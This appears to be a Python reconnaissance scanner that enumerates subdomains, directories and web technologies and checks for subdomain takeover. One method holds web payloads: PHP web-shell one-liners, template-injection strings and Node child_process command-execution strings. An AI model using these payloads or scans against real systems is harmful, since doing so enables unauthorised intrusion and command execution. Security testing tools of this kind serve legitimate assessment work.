import dns.resolver
import requests
import concurrent.futures
from rich.console import Console
import re
from typing import List, Dict, Set
import time
import random
import string
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from rich.progress import Progress

console = Console()

class Enumerator:
    def __init__(self, target: str):
        self.target = target
        self.results = {
            'subdomains': set(),
            'directories': set(),
            'technologies': set(),
            'potential_endpoints': set(),
            'discovered_parameters': set(),
            'takeover_vulnerabilities': []
        }
        self.request_timeout = 5  # Reduced timeout
        self.max_retries = 2  # Reduced retries
        self.delay = 0.1  # Reduced delay
        self.max_workers = 3  # Limited workers
        self.takeover_fingerprints = {
            'github': {
                'fingerprint': 'There isn\'t a GitHub Pages site here.',
                'service': 'GitHub Pages'
            },
            'heroku': {
                'fingerprint': 'no-such-app.html',
                'service': 'Heroku'
            },
            'azure': {
                'fingerprint': 'Azure Web Apps',
                'service': 'Microsoft Azure'
            },
            'aws': {
                'fingerprint': 'NoSuchBucket',
                'service': 'Amazon S3'
            },
            'googlesites': {
                'fingerprint': 'doesn\'t exist',
                'service': 'Google Sites'
            },
            'shopify': {
                'fingerprint': 'Sorry, this shop is currently unavailable.',
                'service': 'Shopify'
            },
            'fastly': {
                'fingerprint': 'Fastly error: unknown domain',
                'service': 'Fastly'
            },
            'pantheon': {
                'fingerprint': 'The gods are wise',
                'service': 'Pantheon'
            }
        }
        self.tech_signatures = {
            'wordpress': [
                '<meta name="generator" content="WordPress',
                '/wp-content/',
                '/wp-includes/'
            ],
            'drupal': [
                'Drupal.settings',
                '/sites/default/files',
                'jQuery.extend(Drupal'
            ],
            'django': [
                'csrfmiddlewaretoken',
                '__admin__',
                'django-debug-toolbar'
            ],
            'flask': [
                'werkzeug',
                'flask',
                'jinja2'
            ],
            'laravel': [
                'laravel_session',
                'XSRF-TOKEN',
                'Illuminate\\',
                'laravel-debugbar'
            ]
        }
        self.subdomain_prefixes = [
            'www', 'mail', 'remote', 'blog', 'webmail', 'server',
            'ns1', 'ns2', 'smtp', 'secure', 'vpn', 'api', 'dev',
            'staging', 'test', 'portal', 'admin', 'intranet'
        ]
        self.directory_list = [
            'admin', 'backup', 'config', 'dashboard', 'db',
            'debug', 'files', 'images', 'include', 'js',
            'log', 'login', 'logs', 'old', 'temp', 'test',
            'upload', 'uploads', 'wp-admin', 'wp-content'
        ]

    def enumerate(self, progress: Progress = None) -> Dict:
        """Run all enumeration tasks with progress tracking"""
        try:
            console.print("[info]Starting enumeration...[/]")

            # Create tasks for progress tracking
            if progress:
                subdomain_task = progress.add_task("[cyan]Enumerating subdomains...", total=len(self.subdomain_prefixes))
                directory_task = progress.add_task("[cyan]Scanning directories...", total=len(self.directory_list))
                tech_task = progress.add_task("[cyan]Detecting technologies...", total=1)
                takeover_task = progress.add_task("[cyan]Checking for takeovers...", total=1)

            # Run tasks sequentially for better stability
            self._enumerate_subdomains(progress, subdomain_task if progress else None)
            self._enumerate_directories(progress, directory_task if progress else None)
            self._detect_technologies(progress, tech_task if progress else None)
            if self.results['subdomains']:
                self._check_subdomain_takeover(progress, takeover_task if progress else None)

            return self.results

        except Exception as e:
            console.print(f"[error]Error during enumeration: {str(e)}[/]")
            return self.results

    def _make_request(self, url: str, timeout: int = None) -> requests.Response:
        """Make a request with retry logic"""
        timeout = timeout or self.request_timeout
        for attempt in range(self.max_retries):
            try:
                response = requests.get(url, timeout=timeout, verify=False, 
                                     headers={'User-Agent': 'Mozilla/5.0 DefSec Scanner'})
                return response
            except requests.RequestException as e:
                if attempt == self.max_retries - 1:
                    raise
                time.sleep(self.delay * (attempt + 1))
        return None

    def _enumerate_subdomains(self, progress: Progress = None, task_id = None) -> None:
        """Enumerate subdomains using DNS requests"""
        resolver = dns.resolver.Resolver()
        resolver.timeout = 2
        resolver.lifetime = 2
        completed = 0

        for prefix in self.subdomain_prefixes:
            try:
                subdomain = f"{prefix}.{self.target}"
                try:
                    answers = resolver.resolve(subdomain)
                    if answers:
                        self.results['subdomains'].add(subdomain)
                except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
                    pass
                except dns.exception.Timeout:
                    continue

                if progress and task_id:
                    completed += 1
                    progress.update(task_id, completed=completed)

                time.sleep(self.delay)
            except Exception as e:
                console.print(f"[warning]Error in subdomain enumeration: {str(e)}[/]")

    def _enumerate_directories(self, progress: Progress = None, task_id = None) -> None:
        """Enumerate directories"""
        base_url = f"http://{self.target}"
        completed = 0

        for directory in self.directory_list:
            try:
                url = f"{base_url}/{directory}"
                response = self._make_request(url, timeout=3)
                if response and response.status_code != 404:
                    self.results['directories'].add(url)

                if progress and task_id:
                    completed += 1
                    progress.update(task_id, completed=completed)

                time.sleep(self.delay)
            except Exception:
                continue

    def _detect_technologies(self, progress: Progress = None, task_id = None) -> None:
        """Detect technologies"""
        try:
            url = f"http://{self.target}"
            response = self._make_request(url, timeout=5)

            if response:
                # Check response headers
                headers = response.headers
                server = headers.get('Server', '')
                powered_by = headers.get('X-Powered-By', '')
                
                if server:
                    self.results['technologies'].add(f"Server: {server}")
                if powered_by:
                    self.results['technologies'].add(f"Powered-By: {powered_by}")
                
                # Check HTML content for technology signatures
                content = response.text
                for tech, patterns in self.tech_signatures.items():
                    if any(pattern in content for pattern in patterns):
                        self.results['technologies'].add(tech)

                # Extract JavaScript files and frameworks
                soup = BeautifulSoup(content, 'html.parser')
                for script in soup.find_all('script'):
                    src = script.get('src', '')
                    if src:
                        if 'jquery' in src.lower():
                            self.results['technologies'].add('jQuery')
                        elif 'react' in src.lower():
                            self.results['technologies'].add('React')
                        elif 'angular' in src.lower():
                            self.results['technologies'].add('Angular')
                        elif 'vue' in src.lower():
                            self.results['technologies'].add('Vue.js')
                if progress and task_id:
                    progress.update(task_id, completed=1)
        except Exception as e:
            console.print(f"[error]Error in technology detection: {str(e)}[/]")
            if progress and task_id:
                progress.update(task_id, completed=1)

    def _extract_endpoints(self, content: str, base_url: str) -> None:
        """Extract potential endpoints and parameters from HTML content"""
        try:
            soup = BeautifulSoup(content, 'html.parser')
            
            # Extract links
            for link in soup.find_all('a'):
                href = link.get('href')
                if href:
                    full_url = urljoin(base_url, href)
                    if self.target in full_url:
                        self.results['potential_endpoints'].add(full_url)

            # Extract form parameters
            for form in soup.find_all('form'):
                for input_field in form.find_all(['input', 'textarea']):
                    name = input_field.get('name')
                    if name:
                        self.results['discovered_parameters'].add(name)

        except Exception as e:
            console.print(f"[warning]Error extracting endpoints: {str(e)}[/]")

    def _generate_custom_payloads(self) -> None:
        """Generate custom payloads based on discovered technologies"""
        try:
            payloads = set()
            
            # Generate technology-specific payloads
            for tech in self.results['technologies']:
                if 'php' in tech.lower():
                    payloads.update([
                        "<?php system($_GET['cmd']); ?>",
                        "<?php eval($_POST['code']); ?>",
                        "<?=`$_GET[0]`?>",
                    ])
                elif 'python' in tech.lower() or 'django' in tech.lower() or 'flask' in tech.lower():
                    payloads.update([
                        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                        "{% debug %}",
                        "{{''.__class__.__mro__[1].__subclasses__()}}"
                    ])
                elif 'node' in tech.lower():
                    payloads.update([
                        "require('child_process').execSync('id')",
                        "process.mainModule.require('child_process').execSync('id')",
                        "global.process.mainModule.require('child_process').execSync('id')"
                    ])

            # Add payloads to results
            self.results['custom_payloads'] = list(payloads)

        except Exception as e:
            console.print(f"[error]Error generating custom payloads: {str(e)}[/]")
    
    def _check_subdomain_takeover(self, progress: Progress = None, task_id = None) -> None:
        """Check for subdomain takeover with progress tracking"""
        try:
            total = len(self.results['subdomains'])
            completed = 0

            for subdomain in self.results['subdomains']:
                try:
                    # Check DNS records
                    try:
                        answers = dns.resolver.resolve(subdomain)
                        cname_records = dns.resolver.resolve(subdomain, 'CNAME')

                        # Check if CNAME points to non-existent domain
                        for cname in cname_records:
                            try:
                                dns.resolver.resolve(str(cname))
                            except dns.resolver.NXDOMAIN:
                                self.results['takeover_vulnerabilities'].append({
                                    'subdomain': subdomain,
                                    'type': 'CNAME Dangling',
                                    'vulnerable_record': str(cname),
                                    'severity': 'HIGH'
                                })
                    except dns.resolver.NXDOMAIN:
                        # Check for service fingerprints
                        url = f"http://{subdomain}"
                        try:
                            response = self._make_request(url)
                            content = response.text.lower()

                            for service, data in self.takeover_fingerprints.items():
                                if data['fingerprint'].lower() in content:
                                    self.results['takeover_vulnerabilities'].append({
                                        'subdomain': subdomain,
                                        'type': 'Service Takeover',
                                        'service': data['service'],
                                        'severity': 'CRITICAL',
                                        'evidence': data['fingerprint']
                                    })
                        except requests.RequestException:
                            pass
                    if progress and task_id:
                        completed += 1
                        progress.update(task_id, completed=(completed/total)*100)
                except Exception as e:
                    console.print(f"[warning]Error checking takeover for {subdomain}: {str(e)}[/]")

                time.sleep(self.delay)

        except Exception as e:
            console.print(f"[error]Error in takeover detection: {str(e)}[/]")
            if progress and task_id:
                progress.update(task_id, completed=100)